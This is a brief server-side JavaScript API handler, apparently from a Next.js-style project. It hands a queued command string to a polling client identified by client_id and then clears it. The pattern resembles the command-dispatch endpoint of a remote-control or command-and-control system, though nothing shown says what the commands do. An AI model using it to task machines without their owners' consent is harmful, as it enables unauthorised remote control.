export default async function handler(req, res) {
  const { client_id } = req.query;
  if (global.clients && global.clients[client_id]) {
    const cmd = global.clients[client_id].command || '';
    global.clients[client_id].command = ''; // reset after fetch
    res.status(200).json({ command: cmd });
  } else {
    res.status(404).json({ error: 'Client not found' });
  }
}
